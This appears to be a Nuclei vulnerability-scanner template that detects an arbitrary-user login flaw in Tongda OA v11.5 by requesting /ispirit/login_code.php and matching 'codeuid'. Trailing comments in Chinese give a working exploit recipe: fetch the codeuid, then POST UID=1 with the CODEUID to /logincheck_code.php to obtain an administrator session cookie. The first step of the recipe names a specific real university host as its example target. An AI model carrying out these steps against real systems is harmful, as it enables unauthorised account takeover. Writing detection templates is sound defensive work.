id: tongdaOA-v11_5-login-code-admin-login
info:
  name: 通达OA v11.5 login_code.php 任意用户登录
  author: cnaq
  severity: medium
  description: 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20login_code.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95.html
  tags: tongdaOA,login,admin
requests:
  - raw:
      - |
        GET /ispirit/login_code.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - 'codeuid'

#1.访问文件https://oaweb.hait.edu.cn//ispirit/login_code.php以获取codeuid。2.访问文件/logincheck_code.php，同时抓包并修改请求包，将请求方式修改为POST方式，传递CODEUID和用户UID，返回的PHPSESSID即身份缓存。
#改包内容：

#将请求方式修改为POST
#增加字段：Content-Type: application/x-www-form-urlencoded
#增加参数：UID=1&CODEUID=_PC{D0FD779B-1E0B-DABE-0CF2-2F7C34438498}&

